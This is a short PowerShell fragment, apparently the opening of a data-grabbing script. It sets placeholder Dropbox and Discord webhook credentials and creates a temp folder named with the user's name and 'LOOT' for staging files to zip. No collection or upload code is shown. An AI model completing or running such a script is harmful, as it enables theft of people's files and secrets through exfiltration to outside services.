$DropboxToken = "blahblahblah"
$DiscordWebhook = "blahblahblah"
$TempFolder = "$env:TEMP\$($env:USERNAME)-LOOT-$(Get-Date -Format 'yyyy-MM-dd_HH-mm')"
$ZipName = "$($TempFolder).zip"

if (-not (Test-Path $TempFolder)) { New-Item -ItemType Directory -Path $TempFolder }
